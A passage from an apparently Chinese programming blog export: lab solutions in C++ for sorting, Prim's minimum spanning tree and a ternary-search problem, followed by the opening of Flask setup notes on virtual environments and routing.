<h5 id="代码-16"><a href="#代码-16" class="headerlink" title="代码"></a>代码</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Partition</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> low, <span class="keyword">int</span> high)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Qsort</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> low, <span class="keyword">int</span> high)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">	<span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">	<span class="keyword">int</span> *digit = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">		<span class="built_in">cin</span> &gt;&gt; digit[i];</span><br><span class="line">	Qsort(digit, <span class="number">0</span>, n<span class="number">-1</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; digit[i] &lt;&lt; <span class="string">" "</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Partition</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> low, <span class="keyword">int</span> high)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> loc = low;</span><br><span class="line">	<span class="keyword">int</span> key = a[low];</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = low + <span class="number">1</span>; i &lt;= high; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (a[i] &lt; key)</span><br><span class="line">		&#123;</span><br><span class="line">			loc++;</span><br><span class="line">			<span class="keyword">if</span> (i != loc)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">int</span> temp = a[i];</span><br><span class="line">				a[i] = a[loc];</span><br><span class="line">				a[loc] = temp;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	a[low] = a[loc];</span><br><span class="line">	a[loc] = key;</span><br><span class="line">	<span class="keyword">return</span> loc;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Qsort</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> low, <span class="keyword">int</span> high)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (low &lt; high)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> loc = Partition(a, low, high);</span><br><span class="line">		Qsort(a, low, loc - <span class="number">1</span>);</span><br><span class="line">		Qsort(a, loc + <span class="number">1</span>, high);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><br></p>
<h3 id="问题-G-算法10-2：折半插入排序"><a href="#问题-G-算法10-2：折半插入排序" class="headerlink" title="问题 G: 算法10-2：折半插入排序"></a>问题 G: 算法10-2：折半插入排序</h3><h5 id="题目描述-17"><a href="#题目描述-17" class="headerlink" title="题目描述"></a>题目描述</h5><p>折半插入排序同样是一种非常简单的排序方法，它的基本操作是在一个已经排好序的有序表中进行查找和插入。不难发现这个查找的过程可以十分自然的修改成折半查找的方式进行实现。<br>折半插入排序的算法可以描述如下：<br><img src="/2019/10/20/数据结构实验复习/20191019185559287.png" alt="在这里插入图片描述"><br>在本题中，读入一串整数，将其使用以上描述的折半插入排序的方法从小到大排序，并输出。</p>
<h5 id="输入-17"><a href="#输入-17" class="headerlink" title="输入"></a>输入</h5><p>输入的第一行包含1个正整数n，表示共有n个整数需要参与排序。其中n不超过1000。<br>第二行包含n个用空格隔开的正整数，表示n个需要排序的整数。</p>
<h5 id="输出-17"><a href="#输出-17" class="headerlink" title="输出"></a>输出</h5><p>只有1行，包含n个整数，表示从小到大排序完毕的所有整数。<br>请在每个整数后输出一个空格，并请注意行尾输出换行。</p>
<h5 id="样例输入-16"><a href="#样例输入-16" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">2</span> <span class="number">8</span> <span class="number">4</span> <span class="number">6</span> <span class="number">1</span> <span class="number">10</span> <span class="number">7</span> <span class="number">3</span> <span class="number">5</span> <span class="number">9</span></span><br></pre></td></tr></table></figure>
<h5 id="样例输出-17"><a href="#样例输出-17" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">1 </span><span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span> <span class="number">7</span> <span class="number">8</span> <span class="number">9</span> <span class="number">10</span></span><br></pre></td></tr></table></figure>
<h5 id="提示-4"><a href="#提示-4" class="headerlink" title="提示"></a>提示</h5><p>在本题中，需要按照题目描述中的算法完成折半插入排序的算法。与直接插入排序算法不同，折半插入排序算法在查找插入位置时采用了折半查找的方案，减少了关键字之间的比较次数，但是记录的移动次数并没有发生改变，因此折半插入排序的时间复杂度依旧为O(n2)，同样不是一种非常高效的排序方法。</p>
<h5 id="思路-16"><a href="#思路-16" class="headerlink" title="思路"></a>思路</h5><p>折半插入排序，即假设前面序列已经是有序的情况下，将下一个数利用二分法查找出在前面有序序列中的位置，然后将其插入进去，知道全部序列有序。</p>
<h5 id="代码-17"><a href="#代码-17" class="headerlink" title="代码"></a>代码</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BInsertSort</span><span class="params">(<span class="keyword">int</span> data[], <span class="keyword">int</span> left, <span class="keyword">int</span> right)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> temp, low, high, mid;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = left + <span class="number">1</span>; i &lt;= right; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		temp = data[i];</span><br><span class="line">		low = left;</span><br><span class="line">		high = i - <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">while</span> (low &lt;= high)</span><br><span class="line">		&#123;</span><br><span class="line">			mid = (low + high) / <span class="number">2</span>;</span><br><span class="line">			<span class="keyword">if</span> (temp &lt; data[mid])</span><br><span class="line">				high = mid - <span class="number">1</span>;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				low = mid + <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = i - <span class="number">1</span>; j &gt;= low; j--)</span><br><span class="line">			data[j + <span class="number">1</span>] = data[j];</span><br><span class="line">		data[low] = temp;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">	<span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">	<span class="keyword">int</span> *digit = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">		<span class="built_in">cin</span> &gt;&gt; digit[i];</span><br><span class="line">	BInsertSort(digit, <span class="number">0</span>, n - <span class="number">1</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; digit[i] &lt;&lt; <span class="string">" "</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><br></p>
<h3 id="问题-H-算法7-9：最小生成树"><a href="#问题-H-算法7-9：最小生成树" class="headerlink" title="问题 H: 算法7-9：最小生成树"></a>问题 H: 算法7-9：最小生成树</h3><h5 id="题目描述-18"><a href="#题目描述-18" class="headerlink" title="题目描述"></a>题目描述</h5><p>最小生成树问题是实际生产生活中十分重要的一类问题。假设需要在n个城市之间建立通信联络网，则连通n个城市只需要n-1条线路。这时，自然需要考虑这样一个问题，即如何在最节省经费的前提下建立这个通信网。<br>可以用连通网来表示n个城市以及n个城市之间可能设置的通信线路，其中网的顶点表示城市，边表示两个城市之间的线路，赋于边的权值表示相应的代价。对于n个顶点的连通网可以建立许多不同的生成树，每一棵生成树都可以是一个通信网。现在，需要选择一棵生成树，使总的耗费最小。这个问题就是构造连通网的最小代价生成树，简称最小生成树。一棵生成树的代价就是树上各边的代价之和。<br>而在常用的最小生成树构造算法中，普里姆（Prim）算法是一种非常常用的算法。以下是其算法的大致结构：<br><img src="/2019/10/20/数据结构实验复习/2019101918562489.png" alt="在这里插入图片描述"><br>在本题中，读入一个无向图的邻接矩阵（即数组表示），建立无向图并按照以上描述中的算法建立最小生成树，并输出最小生成树的代价。</p>
<h5 id="输入-18"><a href="#输入-18" class="headerlink" title="输入"></a>输入</h5><p>输入的第一行包含一个正整数n，表示图中共有n个顶点。其中n不超过50。<br>以后的n行中每行有n个用空格隔开的整数，对于第i行的第j个整数，如果不为0，则表示第i个顶点和第j个顶点有直接连接且代价为相应的值，0表示没有直接连接。当i和j相等的时候，保证对应的整数为0。<br>输入保证邻接矩阵为对称矩阵，即输入的图一定是无向图，且保证图中只有一个连通分量。</p>
<h5 id="输出-18"><a href="#输出-18" class="headerlink" title="输出"></a>输出</h5><p>只有一个整数，即最小生成树的总代价。请注意行尾输出换行。</p>
<h5 id="样例输入-17"><a href="#样例输入-17" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="number">4</span></span><br><span class="line"><span class="symbol">0 </span><span class="number">2</span> <span class="number">4</span> <span class="number">0</span></span><br><span class="line"><span class="symbol">2 </span><span class="number">0</span> <span class="number">3</span> <span class="number">5</span></span><br><span class="line"><span class="symbol">4 </span><span class="number">3</span> <span class="number">0</span> <span class="number">1</span></span><br><span class="line"><span class="symbol">0 </span><span class="number">5</span> <span class="number">1</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>
<h5 id="样例输出-18"><a href="#样例输出-18" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">6</span></span><br></pre></td></tr></table></figure>
<h5 id="提示-5"><a href="#提示-5" class="headerlink" title="提示"></a>提示</h5><p>在本题中，需要掌握图的深度优先遍历的方法，并需要掌握无向图的连通性问题的本质。通过求出无向图的连通分量和对应的生成树，应该能够对图的连通性建立更加直观和清晰的概念</p>
<h5 id="思路-17"><a href="#思路-17" class="headerlink" title="思路"></a>思路</h5><p>用的是Prim算法，实现起来和最小路径的步骤差不多，同样是二维数组存两个点之间的距离，inf表示不可达；<code>book</code>数组存放已经加到最小生成树里的点 。</p>
<p>区别在于这里的<code>dist</code>数组存放的是每个点距离<strong>最小生成树</strong>的最短距离（注意不是起始点，或者说根节点），这样每次更新<code>dist</code>数组的时候只需要比较<code>dist[j]</code>和<code>e[u][j]</code>的大小，而不用加上<code>dist[u]</code>了。</p>
<h5 id="代码-18"><a href="#代码-18" class="headerlink" title="代码"></a>代码</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> inf = <span class="number">0xffffff</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n, dist[<span class="number">55</span>], book[<span class="number">55</span>], e[<span class="number">55</span>][<span class="number">55</span>];</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; n)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>, count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">cin</span> &gt;&gt; e[i][j];</span><br><span class="line">                <span class="keyword">if</span> (i != j &amp;&amp; e[i][j] == <span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    e[i][j] = inf;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//初始化dist数组和book数组</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            dist[i] = e[<span class="number">1</span>][i];</span><br><span class="line">            book[i] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//将1号加到生成树中，并将count加一</span></span><br><span class="line">        book[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">        count++;</span><br><span class="line">        <span class="comment">//最小生成树总共加入n-1个结点即可</span></span><br><span class="line">        <span class="keyword">while</span> (count &lt; n)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> min = inf, u;</span><br><span class="line">            <span class="comment">//找出距离二叉树最小的点</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (book[i] == <span class="number">0</span> &amp;&amp; dist[i] &lt; min)</span><br><span class="line">                &#123;</span><br><span class="line">                    min = dist[i];</span><br><span class="line">                    u = i;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//将该点假如到生成树中,同时count加1</span></span><br><span class="line">            book[u] = <span class="number">1</span>;</span><br><span class="line">            count++;</span><br><span class="line">            <span class="comment">//加上生成树到该点的边的权值</span></span><br><span class="line">            sum += dist[u];</span><br><span class="line">            <span class="comment">//更新dist</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//找不在生成树中，且距离生成树的距离大于更新后的点</span></span><br><span class="line">                <span class="keyword">if</span> (book[j] == <span class="number">0</span> &amp;&amp; dist[j] &gt; e[u][j])</span><br><span class="line">                &#123;</span><br><span class="line">                    dist[j] = e[u][j];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; sum &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><br></p>
<h3 id="问题-J-奶牛的聚会"><a href="#问题-J-奶牛的聚会" class="headerlink" title="问题 J: 奶牛的聚会"></a>问题 J: 奶牛的聚会</h3><h5 id="题目描述-19"><a href="#题目描述-19" class="headerlink" title="题目描述"></a>题目描述</h5><p>农历新年马上就要到了，奶牛们计划举办一次聚会庆祝新年的到来。但是，奶牛们并不喜欢走太远的路，这会给他们的聚会带来消极情绪，当一头奶牛的消极指数为Wi，他参加聚会所需行走的距离为si，那么他就会给聚会带来Si3*Wi的消极情绪。所有奶牛所在位置都在一条直线上，已知所有奶牛的坐标和消极指数，求如何确定聚会地点，使得所有奶牛给聚会带来的消极情绪之和最小，输出消极情绪之和的最小值。</p>
<h5 id="输入-19"><a href="#输入-19" class="headerlink" title="输入"></a>输入</h5><p>第一行包含一个整数 Ca(Ca&lt;=20) ，表示有 Ca 组测试数据。</p>
<p>对于每组测试数据：第一行包含一个整数n(1&lt;=n&lt;=50000) ，表示奶牛的数量。接下来 n 行每行包含两个浮点数Si和wi (-106&lt;=Si&lt;=106, 0&lt;Wi&lt;15)。</p>
<h5 id="输出-19"><a href="#输出-19" class="headerlink" title="输出"></a>输出</h5><p>对于每组测试数据，输出 “Case #c: ans” ，其中c表示测试数据编号，ans表示消极情绪之和的最小值，结果四舍五入为一个整数。</p>
<h5 id="样例输入-18"><a href="#样例输入-18" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">0.9</span> <span class="number">2</span></span><br><span class="line"><span class="number">1.4</span> <span class="number">4</span></span><br><span class="line"><span class="number">3.1</span> <span class="number">1</span></span><br><span class="line"><span class="number">6.2</span> <span class="number">1</span></span><br><span class="line"><span class="number">8.3</span> <span class="number">2</span></span><br></pre></td></tr></table></figure>
<h5 id="样例输出-19"><a href="#样例输出-19" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Case</span> <span class="meta">#1: 300</span></span><br></pre></td></tr></table></figure>
<h5 id="思路-18"><a href="#思路-18" class="headerlink" title="思路"></a>思路</h5><p>三分查找法确定消极情绪之和最小的位置，结合注释应该不难理解。</p>
<h5 id="代码-19"><a href="#代码-19" class="headerlink" title="代码"></a>代码</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">50010</span>;</span><br><span class="line"><span class="keyword">double</span> Si[maxn], wi[maxn];</span><br><span class="line"><span class="keyword">int</span> n, Ca;</span><br><span class="line"><span class="comment">//计算聚会位置在pos时的消极情绪之和</span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">ans</span><span class="params">(<span class="keyword">double</span> pos)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//计算每个奶牛距离聚会位置的距离(非负)</span></span><br><span class="line">        <span class="keyword">double</span> dist = Si[i] - pos;</span><br><span class="line">        <span class="keyword">if</span> (dist &lt; <span class="number">0</span>)</span><br><span class="line">            dist = -dist;</span><br><span class="line">        sum += <span class="built_in">pow</span>(dist, <span class="number">3</span>) * wi[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; Ca;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= Ca; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; Si[j] &gt;&gt; wi[j];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//找到坐标位置最小的奶牛</span></span><br><span class="line">        <span class="keyword">double</span> low = Si[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; n; k++)</span><br><span class="line">            <span class="keyword">if</span> (Si[k] &lt; low)</span><br><span class="line">                low = Si[k];</span><br><span class="line">        <span class="comment">//找到坐标位置最小的奶牛</span></span><br><span class="line">        <span class="keyword">double</span> high = Si[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> l = <span class="number">0</span>; l &lt; n; l++)</span><br><span class="line">            <span class="keyword">if</span> (Si[l] &gt; high)</span><br><span class="line">                high = Si[l];</span><br><span class="line">        <span class="comment">//三分查找法确定最终位置</span></span><br><span class="line">        <span class="keyword">while</span> (high - low &gt; <span class="number">1e-7</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">double</span> m1 = (high + low) / <span class="number">2.0</span>;</span><br><span class="line">            <span class="keyword">double</span> m2 = (m1 + high) / <span class="number">2.0</span>;</span><br><span class="line">            <span class="keyword">if</span> (ans(m1) &gt; ans(m2))</span><br><span class="line">                low = m1;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                high = m2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"Case #"</span> &lt;&lt; i &lt;&lt; <span class="string">": "</span> &lt;&lt; ll(ans(low) + <span class="number">0.5</span>) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Study Notes</category>
      </categories>
      <tags>
        <tag>Study Notes</tag>
      </tags>
  </entry>
  <entry>
    <title>Flask-Notes</title>
    <url>/2020/02/01/Flask-Notes/</url>
    <content><![CDATA[<h1 id="0x01-环境与应用的基本结构"><a href="#0x01-环境与应用的基本结构" class="headerlink" title="0x01 环境与应用的基本结构"></a>0x01 环境与应用的基本结构</h1><h3 id="一、虚拟环境配置"><a href="#一、虚拟环境配置" class="headerlink" title="一、虚拟环境配置"></a>一、虚拟环境配置</h3><h5 id="1-1-创建虚拟环境"><a href="#1-1-创建虚拟环境" class="headerlink" title="1.1 创建虚拟环境"></a>1.1 创建虚拟环境</h5><p>Python 3 和 Python 2 解释器创建虚拟环境的方法有所不同。在 Python 3中，虚拟环境由 Python 标准库中的 venv 包原生支持。</p>
<p>使用如下命令创建虚拟环境：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -m venv virtual-environment-name</span><br></pre></td></tr></table></figure>
<p><code>-m venv</code> 选项的作用是以独立的脚本运行标准库中的 venv 包，后面的参数为虚拟环境的名称。</p>
<p>例如，如下命令创建了一个名称为venv的虚拟环境：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -m venv venv</span><br></pre></td></tr></table></figure>
<p>命令执行完毕后，当前目录中会出现一个名为 venv 的子目录，这里就是一个全新的虚拟环境，包含这个项目专用的 Python 解释器。</p>
<h5 id="1-2-激活虚拟环境"><a href="#1-2-激活虚拟环境" class="headerlink" title="1.2 激活虚拟环境"></a>1.2 激活虚拟环境</h5><p>在Windows下，可以通过如下命令激活虚拟环境：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">venv/Scripts/aivate</span><br></pre></td></tr></table></figure>
<p>虚拟环境激活后，命令行的路径前会有<code>(venv)</code>，此时在命令行中输入python，将调用虚拟环境中的解释器，而不是全局解释器。如果打开了多个命令提示符窗口，则在每个窗口中都要激活虚拟环境。</p>
<p>在命令提示符中输入deactivate，则可以退出当前虚拟环境，还原为PATH环境变量。</p>
<h5 id="1-3-在虚拟环境中安装包"><a href="#1-3-在虚拟环境中安装包" class="headerlink" title="1.3 在虚拟环境中安装包"></a>1.3 在虚拟环境中安装包</h5><p>在激活虚拟环境后，同样可以使用pip包管理器来进行python包的安装。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install flask</span><br></pre></td></tr></table></figure>
<p>可以使用<code>pip freeze</code>命令查看虚拟环境中安装了哪些包<br><img src="/2020/02/01/Flask-Notes/20200122211227958.png" alt="在这里插入图片描述"></p>
<h5 id="1-4-踩坑"><a href="#1-4-踩坑" class="headerlink" title="1.4 踩坑"></a>1.4 踩坑</h5><p>（1）我实在windows下进行的配置，因为电脑上同时安装了python2和python3，所以之前把python3的解释器名字改为了<code>python3.exe</code>，但是使用<code>python3</code>命令创建venv虚拟环境会报错，将<code>python3.exe</code>改回<code>python.exe</code>，再用<code>python</code>命令即可成功创建。</p>
<p>（2）在创建并激活虚拟环境后，发现解释器和pip管理器依然是全局的，后来将路径中的中文去掉，使用全英文路径即可。</p>
<p>&lt;br&gt;</p>
<h3 id="二、应用的基本结构"><a href="#二、应用的基本结构" class="headerlink" title="二、应用的基本结构"></a>二、应用的基本结构</h3><h5 id="2-1-初始化"><a href="#2-1-初始化" class="headerlink" title="2.1 初始化"></a>2.1 初始化</h5><p>所有Flask应用都必须创建一个应用实例，应用实例是Flask类的对象，通常由下述代码创建：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br></pre></td></tr></table></figure>
<p>Flask 类的构造函数只有一个必须指定的参数，即应用主模块或包的名称。在大多数应用中，Python 的 <code>__name__</code> 变量就是所需的值。</p>
<h5 id="2-2-路由和视图函数"><a href="#2-2-路由和视图函数" class="headerlink" title="2.2 路由和视图函数"></a>2.2 路由和视图函数</h5><p>处理 URL 和函数之间关系的程序称为路由 。在 Flask 应用中定义路由的最简便方式，是使用应用实例提供的<code>app.route</code> 装饰器。、</p>
<p>下面的例子说明了如何使用这个装饰器声明路由，其将index()函数注册为根地址的处理程序：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">'&amp;lt;h1&gt;Hello World!&amp;lt;/h1&gt;'</span></span><br></pre></td></tr></table></figure>
<p>除此之外，还能使用动态的路由：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route('/user/&amp;lt;name&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">user</span><span class="params">(name)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">'&amp;lt;h1&gt;Hello, &#123;&#125;!&amp;lt;/h1&gt;'</span>.format(name)</span><br></pre></td></tr></table></figure>
<p>路由的<code>&amp;lt;name&gt;</code>中的内容就是动态部分，任何能匹配静态部分的 URL 都会映射到这个路由上。调用视图函数时，Flask 会将动态部分作为参数传入函数。</p>
<p>路由中的动态部分默认使用字符串，不过也可以是其他类型。<br>例如，路由 <code>/user/&amp;lt;int:id&gt;</code> 只会匹配动态片段 id 为整数的 URL，例如<code>/user/123</code>。<br>Flask 支持在路由中使用 string 、int 、float 和 path 类型。path 类型是一种特殊的字符串，与 string 类型不同的是，它可以包含正斜线。</p>
<h5 id="2-3-一个完整的应用"><a href="#2-3-一个完整的应用" class="headerlink" title="2.3 一个完整的应用"></a>2.3 一个完整的应用</h5><p>使用一个应用实例、一个路由和一个视图函数可以组成一个完整的Flask应用hello.py：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">'&amp;lt;h1&gt;Hello World!&amp;lt;/h1&gt;'</span></span><br></pre></td></tr></table></figure>
<h5 id="2-4-Web开发服务器"><a href="#2-4-Web开发服务器" class="headerlink" title="2.4 Web开发服务器"></a>2.4 Web开发服务器</h5><p>若想启动上面编写的hello.py应用，首先激活虚拟环境。</p>
<p>（1）Linux和macOS用户使用如下命令：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> FLASK_APP=hello.py</span><br><span class="line">flask run</span><br></pre></td></tr></table></figure></p>
<p>（2）在Windows下</p>
<p>如果你的 Terminal 用的是 cmd，则使用如下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> FLASK_APP=hello.py</span><br><span class="line">flask run</span><br></pre></td></tr></table></figure>
<p>如果你的 Terminal 用的是 powershell，则使用如下命令：</p>
